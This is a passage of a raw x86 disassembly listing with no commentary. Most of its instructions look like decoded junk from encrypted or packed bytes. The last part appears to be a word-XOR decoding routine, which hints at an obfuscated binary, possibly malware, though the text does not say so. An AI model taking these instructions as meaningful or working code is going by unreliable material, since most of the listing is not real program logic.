  404172:	mov    edi,0xf05db005
  404177:	xor    DWORD PTR [edi],edx
  404179:	inc    edi
  40417a:	inc    esi
  40417b:	lahf   
  40417c:	inc    edx
  40417d:	pop    ebp
  40417e:	es push ebp
  404180:	aam    0x53
  404182:	outs   dx,DWORD PTR ds:[esi]
  404183:	pusha  
  404184:	f2xm1  
  404186:	push   cs
  404187:	push   edx
  404188:	out    0xcf,al
  40418a:	dec    ebx
  40418b:	pushf  
  40418c:	les    ecx,FWORD PTR [edi+esi*4]
  40418f:	pop    eax
  404190:	xor    cl,BYTE PTR [edx]
  404192:	fidiv  DWORD PTR [eax-0x48]
  404195:	jge    0x4041d3
  404197:	into   
  404198:	sub    bl,dh
  40419a:	fwait
  40419b:	jno    0x4041a4
  40419d:	mov    ecx,0xe8ca2cb6
  4041a2:	xchg   ebx,eax
  4041a3:	(bad)  
  4041a4:	and    bh,BYTE PTR [ecx+ecx*4-0x17]
  4041a8:	cmp    BYTE PTR [ebx],cl
  4041aa:	pop    ecx
  4041ab:	sub    al,dh
  4041ad:	push   ecx
  4041ae:	jle    0x404191
  4041b0:	aas    
  4041b1:	data16 (bad) 
  4041b4:	push   ebp
  4041b5:	xchg   ebp,ebp
  4041b7:	outs   dx,DWORD PTR ds:[esi]
  4041b8:	mov    eax,ds:0xf9e2b7d6
  4041bd:	cmp    eax,0x9098723d
  4041c2:	xor    BYTE PTR [eax-0x3af62e9f],0x2b
  4041c9:	sbb    esi,DWORD PTR [ebp+0x4f]
  4041cc:	cmc    
  4041cd:	push   ecx
  4041ce:	jp     0x4041c3
  4041d0:	and    al,0x21
  4041d2:	dec    ebp
  4041d3:	(bad)  
  4041d4:	mov    ah,0xd3
  4041d6:	rcl    BYTE PTR [edi+0x56],cl
  4041d9:	dec    ebp
  4041da:	adc    bl,ch
  4041dc:	jno    0x4041f9
  4041de:	jo     0x4041a2
  4041e0:	pop    edi
  4041e1:	fsubr  DWORD PTR [edx+eax*1]
  4041e4:	sbb    BYTE PTR [edi],dh
  4041e6:	xor    DWORD PTR ds:0xd53377e4,eax
  4041ec:	sub    bl,bh
  4041ee:	daa    
  4041ef:	xor    esi,DWORD PTR ds:0x9669efd
  4041f5:	add    eax,0xfc2f3938
  4041fa:	pop    ebp
  4041fb:	lods   al,BYTE PTR ds:[esi]
  4041fc:	pusha  
  4041fd:	or     ch,BYTE PTR [eax]
  4041ff:	inc    edi
  404200:	data16 sub al,0x7c
  404203:	add    ch,cl
  404205:	cmp    DWORD PTR [edx],ecx
  404207:	not    al
  404209:	inc    ecx
  40420a:	xor    dl,dl
  40420c:	jge    0x404238
  40420e:	mov    al,ds:0x4bffabd7
  404213:	pop    edi
  404214:	jmp    edx
  404216:	and    dh,dl
  404218:	xchg   ebp,eax
  404219:	out    dx,eax
  40421a:	pop    ds
  40421b:	daa    
  40421c:	pop    esp
  40421d:	and    DWORD PTR [ecx-0x4f],0xae701b80
  404224:	mov    fs,WORD PTR [ebx+0x4e1aa4c1]
  40422a:	jns    0x40420f
  40422c:	fstp   TBYTE PTR [esi-0x2da2da33]
  404232:	inc    esi
  404233:	scas   eax,DWORD PTR es:[edi]
  404234:	mov    ecx,0x265119a1
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fdee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	bswap  ebx
  404259:	test   eax,0x184f93d9
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0xdd70707d
  404265:	mov    edx,0xd6ee79e8
  40426a:	and    eax,0x458b3fa6
  40426f:	xor    DWORD PTR [ebx],ecx
  404271:	test   ebp,edi
  404273:	mov    WORD PTR [esi+edi*1],cs
  404276:	int    0xd9
  404278:	or     DWORD PTR [esi+0x4c],0xe10c657
  40427f:	push   cs
  404280:	xor    ecx,DWORD PTR [esi+0x56]
  404283:	dec    edi
  404284:	mov    WORD PTR [eax+esi*4-0x66bd3bff],cs
  40428b:	jne    0x4042fd
  40428d:	je     0x404215
  40428f:	out    0x2,al
  404291:	nop
  404292:	adc    eax,0xb9bba20b
  404297:	nop
  404298:	pushf  
  404299:	fdivr  QWORD PTR [edi-0x4dfde3d]
  40429f:	mov    ebp,0x6c49a17b
  4042a4:	shl    BYTE PTR [edi],0x81
  4042a7:	retf   0xc4d5
  4042aa:	inc    edx
  4042ab:	call   0x6616:0xe58b121
  4042b2:	scas   al,BYTE PTR es:[edi]
  4042b3:	add    BYTE PTR [ebx],dl
  4042b5:	cmp    DWORD PTR [edx-0x2fff2eb3],ebx
  4042bb:	or     eax,0xee61b13e
  4042c0:	jge    0x404285
  4042c2:	scas   eax,DWORD PTR es:[edi]
  4042c3:	in     eax,0xd8
  4042c5:	fwait
  4042c6:	cmc    
  4042c7:	inc    ebp
  4042c8:	xlat   BYTE PTR ds:[ebx]
  4042c9:	ins    BYTE PTR es:[edi],dx
  4042ca:	fdivr  QWORD PTR [edx]
  4042cc:	pop    es
  4042cd:	mov    ds:0x2188308c,eax
  4042d2:	test   eax,0x7d2812ab
  4042d7:	push   ss
  4042d8:	xchg   esp,eax
  4042d9:	mov    ebx,0x30bf16d2
  4042de:	imul   edx,DWORD PTR [ebx-0x60f23ec0],0x470412bf
  4042e8:	add    al,0xbe
  4042ea:	js     0x404320
  4042ec:	daa    
  4042ed:	add    edx,DWORD PTR [edi]
  4042ef:	outs   dx,BYTE PTR ds:[esi]
  4042f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f1:	retf   0x58d3
  4042f4:	or     al,0x3c
  4042f6:	mov    bl,0x67
  4042f8:	leave  
  4042f9:	jl     0x404366
  4042fb:	getsec 
  4042fd:	out    dx,eax
  4042fe:	popa   
  4042ff:	pop    ecx
  404300:	pop    ds
  404301:	shr    DWORD PTR ds:[esi],1
  404304:	jmp    0xe4dc:0xa01adf6e
  40430b:	or     DWORD PTR [ecx],edi
  40430d:	fstp   TBYTE PTR [ecx-0x4f]
  404310:	cmp    dl,BYTE PTR [esi+0x72fc5491]
  404316:	popa   
  404317:	mov    ebx,0x48dea6a6
  40431c:	add    edi,DWORD PTR [esi+0x67a7957d]
  404322:	sub    DWORD PTR [ecx-0x56],eax
  404325:	outs   dx,DWORD PTR ds:[esi]
  404326:	das    
  404327:	lods   eax,DWORD PTR ds:[esi]
  404328:	(bad)  
  404329:	push   edi
  40432a:	mov    al,ds:0x1939346e
  40432f:	test   eax,0xf6b773e7
  404334:	es jmp 0x3f5ba650
  40433a:	add    eax,0xd3917a1b
  40433f:	out    dx,eax
  404340:	ja     0x404320
  404342:	mov    edi,DWORD PTR [edi+0x637b15ff]
  404348:	shl    DWORD PTR [edi],1
  40434a:	into   
  40434b:	jo     0x4043c0
  40434d:	(bad)  
  40434e:	int3   
  40434f:	dec    edi
  404350:	cmp    eax,0x70cab0c1
  404355:	fcomp  st(3)
  404357:	sbb    edi,DWORD PTR [eax]
  404359:	mov    ds:0x2e9dfee5,eax
  40435e:	in     eax,dx
  40435f:	push   esp
  404360:	rcl    BYTE PTR [ebx+ebp*8-0x5b],0x62
  404365:	xchg   ebp,eax
  404366:	or     eax,0x3727f7f8
  40436b:	addr16 daa 
  40436d:	push   ecx
  40436e:	into   
  40436f:	repnz fsubr st,st(2)
  404372:	add    DWORD PTR [edi],esi
  404374:	xlat   BYTE PTR ds:[ebx]
  404375:	pop    ss
  404376:	fsub   QWORD PTR [ecx-0x310ce4ca]
  40437c:	mov    bh,0xc5
  40437e:	fwait
  40437f:	(bad)  
  404380:	push   0x1ea3d9c0
  404385:	ins    BYTE PTR es:[edi],dx
  404386:	mov    WORD PTR [ebx+0x2f8032bc],es
  40438c:	adc    al,0xbe
  40438e:	mov    ds:0x85eeec86,eax
  404393:	xor    DWORD PTR [edi-0x27],esp
  404396:	sub    ch,cl
  404398:	mov    al,0xd
  40439a:	jg     0x4043c6
  40439c:	xor    al,0x8a
  40439e:	xchg   esp,eax
  40439f:	jmp    0xdd9eb436
  4043a4:	jge    0x4043c3
  4043a6:	out    dx,eax
  4043a7:	and    BYTE PTR [eax],0x94
  4043aa:	fstp   DWORD PTR [edx-0x28]
  4043ad:	pusha  
  4043ae:	jb     0x40440f
  4043b0:	stc    
  4043b1:	cmp    eax,DWORD PTR [edx+0x49]
  4043b4:	mov    esp,DWORD PTR [eax+0x4]
  4043b7:	jmp    0xcaf0:0xbd69e24a
  4043be:	jns    0x404353
  4043c0:	mov    eax,ds:0x8b5e20a4
  4043c5:	enter  0xa8d5,0x45
  4043c9:	dec    esp
  4043ca:	mov    bl,0x6
  4043cc:	pop    ebx
  4043cd:	adc    al,0x51
  4043cf:	and    ch,BYTE PTR [edx-0x553279e6]
  4043d5:	mov    dh,0xf1
  4043d7:	jmp    0x404430
  4043d9:	popa   
  4043da:	cmp    al,0x9c
  4043dc:	pop    ebx
  4043dd:	add    esi,ecx
  4043df:	xchg   BYTE PTR [edx],dl
  4043e1:	sub    al,0xa5
  4043e3:	cmp    al,BYTE PTR ds:0x6cb70b48
  4043e9:	lods   al,BYTE PTR ds:[esi]
  4043ea:	push   ds
  4043eb:	jg     0x404427
  4043ed:	jmp    0x46dc6684
  4043f2:	jne    0x4043da
  4043f4:	stos   BYTE PTR es:[edi],al
  4043f5:	sub    DWORD PTR [ebp+esi*8-0x2b1355e6],0x34
  4043fd:	cli    
  4043fe:	lock rol DWORD PTR [ebx-0x55],cl
  404402:	adc    esi,esp
  404404:	mov    DWORD PTR [esi-0x74cd19ad],0x3188e5ab
  40440e:	cli    
  40440f:	cmp    eax,0xc76fc038
  404414:	cld    
  404415:	rcl    BYTE PTR [ebx-0x69f84599],0xf1
  40441c:	inc    DWORD PTR [edi-0x25]
  40441f:	mov    al,ds:0x54279a31
  404424:	mov    DWORD PTR [ecx+0x6703110a],esp
  40442a:	sub    DWORD PTR [ebp-0x391b7617],edx
  404430:	(bad)  
  404431:	jmp    0x40442f
  404433:	rcl    bl,0x36
  404436:	dec    ecx
  404437:	test   BYTE PTR [esi],cl
  404439:	ror    bl,0xbf
  40443c:	fsubr  QWORD PTR ds:0xe5a1a214
  404442:	add    al,BYTE PTR [eiz*2-0x9161997]
  404449:	pop    esi
  40444a:	and    al,0x80
  40444c:	sbb    BYTE PTR [ebp+0x62862e65],bh
  404452:	cmp    DWORD PTR [eiz*2-0x4a93f4bf],ebx
  404459:	pop    eax
  40445a:	int    0x8a
  40445c:	inc    ecx
  40445d:	or     DWORD PTR [edi],eax
  40445f:	xchg   ecx,eax
  404460:	pop    ecx
  404461:	gs or  eax,0x4077a839
  404467:	add    DWORD PTR [ebx-0x3f8b4bf2],ecx
  40446d:	dec    eax
  40446e:	pushf  
  40446f:	hlt    
  404470:	nop
  404471:	or     DWORD PTR [ebx],ecx
  404473:	adc    DWORD PTR [esi+0x4d4a25e6],esi
  404479:	and    al,0xbe
  40447b:	adc    BYTE PTR [ebp+0x2890579],dh
  404481:	jo     0x404471
  404483:	(bad)  
  404484:	adc    al,0x7b
  404486:	loope  0x404446
  404488:	(bad)  
  404489:	aaa    
  40448a:	pop    edx
  40448b:	mov    ebp,0x466d9677
  404490:	test   al,0xda
  404492:	stos   BYTE PTR es:[edi],al
  404493:	jo     0x4044db
  404495:	jmp    0x1767:0x7561ab7
  40449c:	stc    
  40449d:	fisubr DWORD PTR [edx]
  40449f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a0:	(bad)  
  4044a1:	ds loop 0x404480
  4044a4:	dec    esi
  4044a5:	pop    edx
  4044a6:	fcmove st,st(0)
  4044a8:	adc    BYTE PTR [ebx],0xce
  4044ab:	cmc    
  4044ac:	cmp    al,0x5e
  4044ae:	popa   
  4044af:	or     DWORD PTR [edi],esi
  4044b1:	mov    ds:0x72246b3e,al
  4044b6:	xchg   DWORD PTR [esi],ecx
  4044b8:	idiv   BYTE PTR [ecx-0x5b131f72]
  4044be:	popa   
  4044bf:	cmp    ah,BYTE PTR [ebx-0x38f651b2]
  4044c5:	mov    ch,cl
  4044c7:	inc    esi
  4044c8:	push   esp
  4044c9:	sti    
  4044ca:	test   BYTE PTR [eax+0x73],bh
  4044cd:	out    0x34,eax
  4044cf:	int3   
  4044d0:	push   es
  4044d1:	cmp    al,0x82
  4044d3:	aas    
  4044d4:	jbe    0x4044e4
  4044d6:	ins    BYTE PTR es:[edi],dx
  4044d7:	nop
  4044d8:	lahf   
  4044d9:	mov    esp,DWORD PTR [ebx+0x184f74a1]
  4044df:	mov    eax,ds:0xb7c075e7
  4044e4:	mov    ebx,0xe0fbba3a
  4044e9:	adc    DWORD PTR [ecx],ebx
  4044eb:	jnp    0x4044da
  4044ed:	pusha  
  4044ee:	fisttp WORD PTR [ebx+0x4c9229d4]
  4044f4:	sbb    eax,0xdf1ffca0
  4044f9:	test   ah,dh
  4044fb:	xor    DWORD PTR [edi],esp
  4044fd:	xchg   ecx,eax
  4044fe:	sbb    esi,DWORD PTR [ebp+0x10]
  404501:	popa   
  404502:	ins    DWORD PTR es:[edi],dx
  404503:	out    0x51,al
  404505:	(bad)  
  404506:	cwde   
  404507:	enter  0xd251,0x7e
  40450b:	imul   ebp,DWORD PTR [eax-0x26],0x94fa5690
  404512:	rcl    bh,0x3a
  404515:	jecxz  0x4044bf
  404517:	mov    al,ds:0x66fa960a
  40451c:	outs   dx,BYTE PTR ds:[esi]
  40451d:	test   BYTE PTR [esi+0x11],bl
  404520:	push   esp
  404521:	cdq    
  404522:	jo     0x40452d
  404524:	or     eax,0xe5037e29
  404529:	in     al,0xcd
  40452b:	sbb    edi,DWORD PTR [edx-0x3d]
  40452e:	or     esi,DWORD PTR [ebx+0x59d906ac]
  404534:	nop
  404535:	mov    dl,0x9e
  404537:	jnp    0x404574
  404539:	mov    BYTE PTR [edx-0x5b485e2b],dl
  40453f:	sahf   
  404540:	or     edx,eax
  404542:	push   0xffffffab
  404544:	sub    al,BYTE PTR [ebx+0x8]
  404547:	mov    ecx,0xa5513578
  40454c:	out    0x1,al
  40454e:	aaa    
  40454f:	lods   al,BYTE PTR ds:[esi]
  404550:	dec    edx
  404551:	ss popa 
  404553:	fimul  DWORD PTR [ecx-0x1f25cdd1]
  404559:	sub    edi,DWORD PTR [edx]
  40455b:	sub    BYTE PTR [ebp+0x49d8c2ad],ch
  404561:	nop
  404562:	or     edi,DWORD PTR [esi]
  404564:	ins    DWORD PTR es:[edi],dx
  404565:	mov    bl,0xc1
  404567:	mov    edi,0x2bfb3ec9
  40456c:	std    
  40456d:	ret    0xcd9e
  404570:	mov    edi,0x3d2ee394
  404575:	out    dx,eax
  404576:	(bad)  
  404577:	jbe    0x40451e
  404579:	loope  0x4045dc
  40457b:	in     al,dx
  40457c:	jecxz  0x404525
  40457e:	fisubr WORD PTR [edi-0x1cee1b0b]
  404584:	jmp    0xd3fd:0xd5e6870b
  40458b:	test   al,0xfb
  40458d:	or     edi,DWORD PTR [ebp+0x7accae85]
  404593:	retf   
  404594:	sahf   
  404595:	pop    ebp
  404596:	(bad)  
  404598:	mov    edi,0x3680763
  40459d:	cmp    DWORD PTR [edx+0x428f1373],ebx
  4045a3:	adc    bh,bl
  4045a5:	pop    ss
  4045a6:	xchg   esp,eax
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fe02,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	mov    BYTE PTR [ebp+0x240ce1c9],ch
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xeb70707d
  4045d4:	and    al,0xe2
  4045d6:	xchg   ecx,eax
  4045d7:	pop    edi
  4045d8:	jmp    FWORD PTR [ecx-0x5c9e8132]
  4045de:	inc    edi
  4045df:	mov    eax,ds:0xc2503185
  4045e4:	push   es
  4045e5:	sahf   
  4045e6:	cmp    BYTE PTR [eax-0x4bf50c88],bl
  4045ec:	adc    bh,BYTE PTR [edx]
  4045ee:	repz cmp eax,0x45083695
  4045f4:	faddp  st(5),st
  4045f6:	cmc    
  4045f7:	dec    ecx
  4045f8:	or     DWORD PTR [esi-0x18],eax
  4045fb:	into   
  4045fc:	and    ecx,esi
  4045fe:	stc    
  4045ff:	push   ebp
  404600:	sub    DWORD PTR [eax-0x27dde90e],edx
  404606:	or     esp,0x1d9b5300
  40460c:	fdiv   QWORD PTR [edx-0x71]
  40460f:	or     eax,0x63fbec4a
  404614:	inc    ebx
  404615:	out    dx,al
  404616:	xor    al,0x53
  404618:	ret    
  404619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40461a:	cmp    al,0x5f
  40461c:	adc    ebx,0x55ba67f5
  404622:	adc    eax,0x8ba4be52
  404627:	push   ss
  404628:	into   
  404629:	mov    eax,ds:0x38df7375
  40462e:	ja     0x4045ea
  404630:	js     0x4046a2
  404632:	xor    al,0x2b
  404634:	sub    BYTE PTR [eax-0x10792e84],dl
  40463a:	in     al,dx
  40463b:	cmp    eax,0x42fd4c78
  404640:	in     al,0x26
  404642:	push   edx
  404643:	sub    eax,0x5a6a7588
  404648:	aam    0x56
  40464a:	mov    edi,0xf0c4b25c
  40464f:	jne    0x404618
  404651:	out    0xdb,eax
  404653:	inc    esp
  404654:	bound  esi,QWORD PTR [edx+0x19db8cf9]
  40465a:	scas   al,BYTE PTR es:[edi]
  40465b:	mov    esp,0x8c0f6d0
  404660:	std    
  404661:	pop    ds
  404662:	retf   
  404663:	mov    eax,0x7578fa53
  404668:	push   edx
  404669:	xchg   ebx,eax
  40466a:	(bad)  
  40466b:	adc    al,0x28
  40466d:	jb     0x4046cb
  40466f:	iret   
  404670:	inc    ebp
  404671:	scas   eax,DWORD PTR es:[edi]
  404672:	js     0x4046f0
  404674:	dec    ebx
  404675:	cmp    al,0x48
  404677:	mov    bh,0x6b
  404679:	xor    al,0x9c
  40467b:	stc    
  40467c:	or     ecx,DWORD PTR [esi+0x478b0621]
  404682:	mov    BYTE PTR [edi],dh
  404684:	(bad)  
  404685:	fcomi  st,st(0)
  404687:	(bad)  
  404688:	cs (bad) 
  40468a:	pop    edx
  40468b:	in     al,dx
  40468c:	cwde   
  40468d:	in     eax,0xa3
  40468f:	mov    cl,0x84
  404691:	cmp    al,0xce
  404693:	(bad)  
  404694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404695:	mov    eax,ds:0x424a2237
  40469a:	sub    eax,0x6ccb3fa6
  40469f:	mov    cl,0xf5
  4046a1:	bound  edi,QWORD PTR [ebp+0x65]
  4046a4:	fwait
  4046a5:	sub    ebp,ebx
  4046a7:	and    bh,BYTE PTR [ecx+0x5b9c8b37]
  4046ad:	dec    edx
  4046ae:	in     eax,dx
  4046af:	out    dx,al
  4046b0:	mov    edi,0x44c2b4b4
  4046b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b7:	(bad)  
  4046b8:	lds    edi,FWORD PTR [ebx+ebx*1+0x322399a3]
  4046bf:	into   
  4046c0:	outs   dx,BYTE PTR ds:[esi]
  4046c1:	sub    BYTE PTR [ebx-0x3e],dh
  4046c4:	adc    al,0xb3
  4046c6:	push   edi
  4046c7:	test   al,0x65
  4046c9:	ds frndint 
  4046cc:	pop    ss
  4046cd:	leave  
  4046ce:	mov    ebx,ebp
  4046d0:	div    DWORD PTR [esi]
  4046d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046d3:	es xchg ebp,eax
  4046d5:	sar    ebx,1
  4046d7:	(bad)  
  4046d9:	imul   ecx,DWORD PTR [esi-0x71],0x25de4792
  4046e0:	sbb    BYTE PTR [eax-0x4330b206],bl
  4046e6:	push   edx
  4046e7:	(bad)  
  4046e8:	and    al,0x3f
  4046ea:	adc    ebp,DWORD PTR [ebx]
  4046ec:	sbb    BYTE PTR [edi-0x5ab3726e],bl
  4046f2:	gs clc 
  4046f4:	aaa    
  4046f5:	inc    ecx
  4046f6:	mov    ds:0xae9fc8da,al
  4046fb:	push   0xffffffc4
  4046fd:	imul   ebp,DWORD PTR [ecx-0x2c],0xfffffffd
  404701:	lods   al,BYTE PTR ds:[esi]
  404702:	gs mov ecx,ebp
  404705:	hlt    
  404706:	cmp    BYTE PTR [esi+0x59],cl
  404709:	pop    ss
  40470a:	push   esi
  40470b:	sub    ecx,DWORD PTR [edi+0x42ef0305]
  404711:	adc    edi,DWORD PTR [edx]
  404713:	scas   al,BYTE PTR es:[edi]
  404714:	int    0xf
  404716:	mov    al,ds:0xbe32a51f
  40471b:	jge    0x40478d
  40471d:	and    al,0xce
  40471f:	aam    0xa2
  404721:	out    0x6e,al
  404723:	mov    dl,0x81
  404725:	jl     0x404729
  404727:	add    dh,BYTE PTR [esi]
  404729:	sar    DWORD PTR [esi+ecx*4+0x40b497c1],1
  404730:	push   ebx
  404731:	(bad)  
  404732:	js     0x40473b
  404734:	sub    esi,DWORD PTR [esi+eax*2+0x5a11adc3]
  40473b:	pop    ss
  40473c:	adc    edi,0xffffffe0
  40473f:	cmp    BYTE PTR [eax],0x5c
  404742:	out    0x56,al
  404744:	jb     0x404765
  404746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404747:	es in  eax,dx
  404749:	fwait
  40474a:	cwde   
  40474b:	inc    esp
  40474c:	rol    dh,1
  40474e:	and    al,0x54
  404750:	dec    esi
  404751:	xchg   edx,eax
  404752:	sahf   
  404753:	jne    0x404776
  404755:	scas   al,BYTE PTR es:[edi]
  404756:	pop    ds
  404757:	mov    eax,0x623e7f
  40475c:	pushf  
  40475d:	ror    ebx,0xa9
  404760:	or     eax,0xa900c1a2
  404765:	mov    eax,ds:0xff3d420e
  40476a:	or     ah,BYTE PTR [esi-0x2e]
  40476d:	clc    
  40476e:	adc    ah,dh
  404770:	stos   DWORD PTR es:[edi],eax
  404771:	fisubr WORD PTR [eax]
  404773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404774:	loope  0x40475f
  404776:	cli    
  404777:	lds    esp,FWORD PTR [ebp-0x75ba21a4]
  40477d:	xor    BYTE PTR [ebx],ah
  40477f:	pop    ebp
  404780:	cmp    ch,BYTE PTR [edi+0xd]
  404783:	bound  ebx,QWORD PTR ds:0xd04bd95a
  404789:	mov    eax,0x4e1ee952
  40478e:	inc    edi
  40478f:	test   bl,ah
  404791:	rol    BYTE PTR [ebx+0x68],cl
  404794:	jb     0x404779
  404796:	mov    ss,esp
  404798:	sahf   
  404799:	(bad)  
  40479a:	lods   al,BYTE PTR ds:[esi]
  40479b:	test   al,0xa7
  40479d:	jne    0x4047d4
  40479f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a0:	outs   dx,DWORD PTR ds:[esi]
  4047a1:	pop    ss
  4047a2:	loope  0x40474a
  4047a4:	jb     0x4047c6
  4047a6:	jnp    0x404734
  4047a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a9:	fsubr  DWORD PTR [esi+0x19]
  4047ac:	mov    esp,eax
  4047ae:	out    0x78,al
  4047b0:	push   ss
  4047b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b2:	outs   dx,BYTE PTR ds:[esi]
  4047b3:	or     al,0x65
  4047b5:	dec    BYTE PTR ds:[esp+eiz*8-0x22871010]
  4047bd:	pop    es
  4047be:	shl    BYTE PTR [ecx+0x3bf2c2f0],1
  4047c4:	daa    
  4047c5:	xchg   esp,eax
  4047c6:	pop    esi
  4047c7:	push   edi
  4047c8:	mov    cl,0x8a
  4047ca:	xchg   ecx,eax
  4047cb:	pop    ds
  4047cc:	xchg   edx,eax
  4047cd:	xchg   ecx,eax
  4047ce:	and    eax,DWORD PTR [ecx+0x7f4101fc]
  4047d4:	mov    ds:0xb3360ffc,al
  4047d9:	dec    eax
  4047da:	mov    ecx,0x2bc9d647
  4047df:	dec    edx
  4047e0:	gs (bad) 
  4047e2:	loop   0x40483c
  4047e4:	add    BYTE PTR [edx+0x3c1ce070],ch
  4047ea:	adc    dl,BYTE PTR [ebx+0xf3b8e21]
  4047f0:	popf   
  4047f1:	mov    dl,0x7
  4047f3:	sub    cl,dl
  4047f5:	mov    ah,dh
  4047f7:	mov    edx,0x4ace0c0b
  4047fc:	icebp  
  4047fd:	cmc    
  4047fe:	jg     0x404867
  404800:	hlt    
  404801:	test   BYTE PTR [edx+0x71],ah
  404804:	lods   al,BYTE PTR ds:[esi]
  404805:	sub    DWORD PTR [edi+0xb9f2a19],edi
  40480b:	fwait
  40480c:	ret    0xbc57
  40480f:	je     0x4047f3
  404811:	loop   0x404858
  404813:	ds push ebx
  404815:	std    
  404816:	ror    BYTE PTR [ecx+0x26ed3a56],1
  40481c:	fwait
  40481d:	call   0x12e1:0xa1ba0dfb
  404824:	dec    ebx
  404825:	test   eax,0xad7f2a94
  40482a:	cmp    DWORD PTR [ebp+0x42],esi
  40482d:	push   ecx
  40482e:	add    eax,0xe57ae87b
  404833:	(bad)  [ecx+ecx*4+0x29]
  404837:	mov    bl,0x90
  404839:	pop    edi
  40483a:	push   eax
  40483b:	add    al,0xef
  40483d:	xchg   BYTE PTR [edx-0x6c],ch
  404840:	sub    bl,BYTE PTR [eax-0x4b7d7615]
  404846:	lahf   
  404847:	outs   dx,BYTE PTR ds:[esi]
  404848:	test   eax,0xbfaf8c8b
  40484d:	add    BYTE PTR [eax+edx*2],al
  404850:	popa   
  404851:	test   eax,0x70c4376f
  404856:	mov    cl,0x80
  404858:	xor    dh,BYTE PTR [esi+0x1b531ac4]
  40485e:	fsub   DWORD PTR [ebx-0x53]
  404861:	stos   DWORD PTR es:[edi],eax
  404862:	xchg   DWORD PTR [ecx+0x59],edx
  404865:	and    DWORD PTR [ebx+0x2e],edi
  404868:	push   ebp
  404869:	sub    BYTE PTR [edx+0x74251fa1],al
  40486f:	push   ecx
  404870:	or     DWORD PTR [esi+esi*8],edx
  404873:	sub    ebp,DWORD PTR [edx+0x45863ca9]
  404879:	mov    edi,0x34493384
  40487e:	test   al,0xa2
  404880:	sbb    ah,dh
  404882:	in     eax,0x9e
  404884:	rcr    BYTE PTR [edi+0x42],1
  404887:	mov    al,ds:0xeab7284d
  40488c:	fs inc esp
  40488e:	mov    bh,0x67
  404890:	imul   edi,DWORD PTR [ecx+0xe],0x6b
  404894:	bound  edx,QWORD PTR [ecx]
  404896:	repnz pop es
  404898:	jge    0x4048a1
  40489a:	out    dx,eax
  40489b:	sub    BYTE PTR [esi+0x26],0x41
  40489f:	or     edi,DWORD PTR [ecx+eax*4-0x3e]
  4048a3:	out    dx,al
  4048a4:	imul   esi,esi,0xa14d6686
  4048aa:	jge    0x404866
  4048ac:	sub    bl,BYTE PTR [esi-0x7a971982]
  4048b2:	mov    BYTE PTR [ebx*4-0x62908dee],ah
  4048b9:	dec    edx
  4048ba:	jle    0x4048c2
  4048bc:	cmp    eax,ebp
  4048be:	cmp    DWORD PTR [edx],0x63
  4048c1:	clc    
  4048c2:	cs jo  0x404862
  4048c5:	jmp    0xb066:0x82968b8d
  4048cc:	sti    
  4048cd:	cmp    cl,al
  4048cf:	and    BYTE PTR [eiz*1-0x18c17c8b],dh
  4048d6:	push   esi
  4048d7:	cmp    bl,BYTE PTR [ebx-0x40]
  4048da:	xchg   esp,eax
  4048db:	sar    BYTE PTR [ebp+0x69ede73e],0xdb
  4048e2:	lea    eax,[edi]
  4048e4:	xlat   BYTE PTR ds:[ebx]
  4048e5:	cmc    
  4048e6:	fsin   
  4048e8:	xchg   ecx,eax
  4048e9:	arpl   bp,si
  4048eb:	jmp    0xb44b:0xcc6bb06c
  4048f2:	or     BYTE PTR [edx-0x45dcf947],ah
  4048f8:	lock jmp 0x404954
  4048fb:	out    dx,eax
  4048fc:	xchg   edi,eax
  4048fd:	pusha  
  4048fe:	push   0x308c6837
  404903:	repz and DWORD PTR [eax],eax
  404906:	or     al,0xc
  404908:	pop    esp
  404909:	or     BYTE PTR [ebx+0x74],ch
  40490c:	xlat   BYTE PTR ds:[ebx]
  40490d:	test   eax,0x54f712ee
  404912:	ins    DWORD PTR es:[edi],dx
  404913:	add    DWORD PTR ds:0xf4458bac,esp
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e19c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e1a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e77f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e1b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd85,0x42e1b4
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fdfa,0x42fd79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fdfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e783,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe02,0x42fdfe
